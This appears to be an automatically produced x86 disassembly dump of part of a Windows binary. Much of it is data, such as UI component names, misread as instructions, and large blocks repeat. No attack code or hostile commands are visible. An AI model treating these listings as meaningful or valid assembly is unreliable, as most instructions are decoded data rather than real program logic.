add [ eax ] al
add [ eax ] al
add [ eax ] al
out dx eax
inc esp
add [ ecx ] ch
add bh bh
imul eax [ eax ] 0x1ff00
test dl dh
inc esp
add [ eax ] cl
add [ eax ] al
add [ eax - 0x73 ] bl
inc edx
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add [ esi + edi * 2 - 0x7f03ffbf ] bh
inc ecx
add [ ebp + edi * 2 + 0x41 ] ch
add al ch
jge r-xdata
add [ eax + 0x58 ] al
outsb
sub al 0xe4
inc esp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
out dx eax
inc esp
add al bh
jmp r-xdata
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
ror [ edx + esi * 8 ] 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
inc esp
add [ eax + eax ] dl
add [ eax ] al
inc eax
pop eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
shl [ ebx ] 0x40
add [ esi + edi ] ah
inc ebp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
add [ eax + eax ] al
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_443cb8
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
mov es [ edx ]
fmul [ esi - 0x7137ffbe ]
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
cwde
mov es [ edx ]
cld
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax - 0x3ffbd72 ] bl
imul esi [ ebx + 0x74 ] 0x44f27890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 8 + 0x80044 ] al
add [ eax ] al
pop eax
lea eax [ edx ]
mov ah 0x33
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
sub_44ece2
add [ ebx ] cl
add [ 0x756e654d ] al
jae r-xdata
add [ esp + edi + 0x10045 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] ah
out 0x44 al
add [ esp + edi + 0x3cbc0045 ] ch
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0xa865646f
leave
dec eax
outsd
je r-xdata
adc [ eax ] al
inc eax
add [ eax ] al
call [ edi + esi ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
jns r-xdata
or al [ eax ]
or [ edi + 0x6e ] cl
jb r-xdata
inc esp
add [ eax ] cl
add bh bh
push eax
cmp [ ebp ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ esi ] al
test al 0xc9
and dh ah
inc esp
add ah cl
cmp al 0x45
add ah bl
cmp al 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
pushfd
jo r-xdata
outsb
je r-xdata
ja r-xdata
dec ecx
insd
popad
jae r-xdata
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
insd
popad
inc edx
outsd
outsb
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
inc esp
add [ esi ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
sbb dh ch
adc [ eax ] al
inc ecx
add [ eax ] al
dec [ eax + 0x3c ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
add [ eax ] ah
xor [ eax ] eax
and [ ebp + eax * 2 ] al
mov [ ebp - 0x15afffbf ] es
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
push esp
outsd
jne r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
je r-xdata
outsb
je r-xdata
add ah cl
cmp al 0x45
add ah bl
cmp al 0x45
add [ ecx ] al
jo r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
out dx al
inc esp
add [ ebp - 0x1097ffc0 ] cl
outsd
inc eax
add [ ebx + esi + 0x31040040 ] bh
inc eax
je r-xdata
outsd
insd
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
or [ eax + 0x61 ] dh
jo r-xdata
cwde
out dx al
inc esp
add [ 0x654c616d ] cl
je r-xdata
jb r-xdata
inc ebx
push 0x65676e61
nop
sbb al 0xee
inc esp
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
jo r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x2c65646f
in al 0x44
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000a ] al
outsb
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add [ esp + edi + 0x3cbc0045 ] ch
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
outsd
add al 0xef
inc esp
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add [ ebx + eax * 2 + 0x37d80045 ] ch
inc ebp
add [ eax + esi ] bl
inc ebp
add [ eax ] cl
cmp [ ebp ] al
push esp
inc esp
inc ebp
add [ eax * 2 + 0x540a0045 ] cl
push eax
outsd
jo r-xdata
or eax 0x6f42616d
insd
je r-xdata
jne r-xdata
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
pop esp
out dx al
inc esp
add [ ebx ] al
or al 0x54
push esp
jb r-xdata
dec ebp
outsb
jne r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] r--data
outsd
push eax
outsd
jo r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5065646f
dec eax
outsd
je r-xdata
inc ecx
add [ eax - 0xfffbe7c ] ch
aaa
inc ebp
add [ eax + edi - 0x14c7ffbb ] cl
inc ecx
add [ eax ] dh
in al dx
inc ecx
add [ eax - 0x12 ] ah
inc ecx
add [ eax - 0x15 ] cl
inc ecx
dec eax
out dx al
inc ecx
add al al
mov esp 0x70044ef
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
add [ eax ] bl
out dx al
out dx al
inc esp
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax ] ah
inc esp
inc ebp
add [ ebp + eax * 4 - 0x15afffbf ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax - 0x72ffbb12 ] ebx
inc eax
add [ eax - 0x11 ] ch
add [ eax ] al
inc esp
jmp r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 8 + 0x780044 ] ch
outsd
inc edx
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 8 + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
out dx eax
inc esp
add [ eax ] bh
je r-xdata
outsd
dec esp
add [ esi ] al
push cs
push esp
dec ebp
outsb
jne r-xdata
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
adc al 0x37
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
jo r-xdata
jns r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
jo r-xdata
outsb
add eax 0x756e654d
jae r-xdata
jo r-xdata
je r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
push cs
push eax
popad
jb r-xdata
dec [ eax + 0x3c ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
test al 0xc9
inc esp
add [ eax ] cl
add bh bh
push eax
cmp [ ebp ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push es
dec ecx
insd
popad
jae r-xdata
inc ecx
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax ] bl
jge r-xdata
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
or al [ eax ]
or eax 0x756e654d
inc ecx
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ecx
inc ecx
add [ eax ] dh
add [ eax ] al
push [ esp + edi ]
inc ebp
add [ esi + 0x45 ] ch
add [ eax - 0x80000000 ] al
push edx
inc ecx
add [ eax + 0x44 ] ch
inc ebp
add [ eax + 0x44 ] dh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
push eax
and dh ah
inc esp
add [ eax ] al
add al 0x0
add [ eax ] al
outsb
jne r-xdata
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax - 0x12 ] bl
inc esp
add [ 0x69526274 ] cl
push 0x74754274
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
inc ebx
push 0x65676e61
mov esp 0x70004152
add [ eax ] al
push [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5865646f
out dx al
inc esp
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
out dx eax
inc esp
add [ ecx ] ch
add bh bh
imul eax [ eax ] 0x1ff00
test dl dh
inc esp
add [ eax ] cl
add [ eax ] al
add [ eax - 0x73 ] bl
inc edx
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add [ esi + edi * 2 - 0x7f03ffbf ] bh
inc ecx
add [ ebp + edi * 2 + 0x41 ] ch
add al ch
jge r-xdata
add [ eax + 0x58 ] al
outsb
sub al 0xe4
inc esp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
out dx eax
inc esp
add al bh
jmp r-xdata
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
ror [ edx + esi * 8 ] 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
inc esp
add [ eax + eax ] dl
add [ eax ] al
inc eax
pop eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
shl [ ebx ] 0x40
add [ esi + edi ] ah
inc ebp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
add [ eax + eax ] al
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_443cb8
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
mov es [ edx ]
fmul [ esi - 0x7137ffbe ]
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
cwde
mov es [ edx ]
cld
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax - 0x3ffbd72 ] bl
imul esi [ ebx + 0x74 ] 0x44f27890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 8 + 0x80044 ] al
add [ eax ] al
pop eax
lea eax [ edx ]
mov ah 0x33
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
sub_44ef47
add [ eax - 0x12 ] cl
add ah cl
cmp al 0x45
add ah bl
cmp al 0x45
add [ ecx ] al
jo r-xdata
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add [ esp + edi + 0x3cbc0045 ] ch
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] r--data
outsd
push eax
outsd
jo r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5065646f
dec eax
outsd
je r-xdata
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax ] ah
inc esp
inc ebp
add [ ebp + eax * 4 - 0x15afffbf ] cl
inc ecx
add [ eax - 0xfffbe7c ] ch
aaa
inc ebp
add [ eax + edi - 0x14c7ffbb ] cl
inc ecx
add [ eax ] dh
in al dx
inc ecx
add [ eax - 0x12 ] ah
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add [ ebx + eax * 2 + 0x37d80045 ] ch
inc ebp
add [ eax + esi ] bl
inc ebp
add [ eax ] cl
cmp [ ebp ] al
push esp
inc esp
inc ebp
add [ eax * 2 + 0x540a0045 ] cl
push eax
outsd
jo r-xdata
dec eax
out dx al
mov esp 0x70044ef
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
adc al 0x37
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
jo r-xdata
jns r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
jo r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
push cs
push eax
popad
jb r-xdata
dec [ eax + 0x3c ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
test al 0xc9
inc esp
add [ eax ] cl
add bh bh
push eax
cmp [ ebp ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push es
dec ecx
insd
popad
jae r-xdata
inc ecx
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax ] bl
jge r-xdata
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
or al [ eax ]
or eax 0x756e654d
inc ecx
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ecx
inc ecx
add [ eax ] dh
add [ eax ] al
push [ esp + edi ]
inc ebp
add [ esi + 0x45 ] ch
add [ eax - 0x80000000 ] al
push edx
inc ecx
add [ eax + 0x44 ] ch
inc ebp
add [ eax + 0x44 ] dh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
push eax
and dh ah
inc esp
add [ eax ] al
add al 0x0
add [ eax ] al
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
inc ebx
push 0x65676e61
mov esp 0x70004152
add [ eax ] al
push [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5865646f
out dx al
inc esp
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
out dx eax
inc esp
add [ ecx ] ch
add bh bh
imul eax [ eax ] 0x1ff00
test dl dh
inc esp
add [ eax ] cl
add [ eax ] al
add [ eax - 0x73 ] bl
inc edx
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add [ esi + edi * 2 - 0x7f03ffbf ] bh
inc ecx
add [ ebp + edi * 2 + 0x41 ] ch
add al ch
jge r-xdata
add [ eax + 0x58 ] al
outsb
sub al 0xe4
inc esp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
out dx eax
inc esp
add al bh
jmp r-xdata
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
ror [ edx + esi * 8 ] 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
inc esp
add [ eax + eax ] dl
add [ eax ] al
inc eax
pop eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
shl [ ebx ] 0x40
add [ esi + edi ] ah
inc ebp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
add [ eax + eax ] al
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_443cb8
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
mov es [ edx ]
fmul [ esi - 0x7137ffbe ]
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
cwde
mov es [ edx ]
cld
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax - 0x3ffbd72 ] bl
imul esi [ ebx + 0x74 ] 0x44f27890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 8 + 0x80044 ] al
add [ eax ] al
pop eax
lea eax [ edx ]
mov ah 0x33
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
sub_44efcf
add [ eax ] dl
add [ 0x756e654d ] al
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
and dh ah
inc esp
add [ esp + edi + 0x3cbc0045 ] ch
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] bl
out dx al
inc esp
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5065646f
dec eax
outsd
je r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
jns r-xdata
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
adc al 0x37
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
push edx
inc ecx
add [ eax + 0x44 ] ch
inc ebp
add [ eax + 0x44 ] dh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
push eax
and dh ah
inc esp
add ah cl
cmp al 0x45
add ah bl
cmp al 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
push cs
push eax
popad
jb r-xdata
dec [ eax + 0x3c ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
test al 0xc9
inc esp
add [ eax ] cl
add bh bh
push eax
cmp [ ebp ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push es
dec ecx
insd
popad
jae r-xdata
jo r-xdata
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5865646f
out dx al
inc esp
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ecx
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax ] bl
jge r-xdata
je r-xdata
inc ebx
push 0x65676e61
mov esp 0x70004152
add [ eax ] al
push [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
out dx eax
inc esp
add [ ecx ] ch
add bh bh
imul eax [ eax ] 0x1ff00
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul eax [ eax ] r--data
outsd
push eax
outsd
jo r-xdata
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
ror [ edx + esi * 8 ] 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
inc esp
add [ eax + eax ] dl
add [ eax ] al
inc eax
pop eax
test dl dh
inc esp
add [ eax ] cl
add [ eax ] al
add [ eax - 0x73 ] bl
inc edx
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add [ esi + edi * 2 - 0x7f03ffbf ] bh
inc ecx
add [ ebp + edi * 2 + 0x41 ] ch
add al ch
jge r-xdata
add [ eax + 0x58 ] al
outsb
sub al 0xe4
inc esp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
add bh bh
add [ eax ] eax
jo r-xdata
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_443cb8
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
add ah al
xor eax [ eax ]
enter 0x4033 0x0
shl [ ebx ] 0x40
add [ esi + edi ] ah
inc ebp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
or al [ eax ]
or eax 0x756e654d
inc ecx
inc [ ecx ]
add [ eax ] al
add [ eax ] al
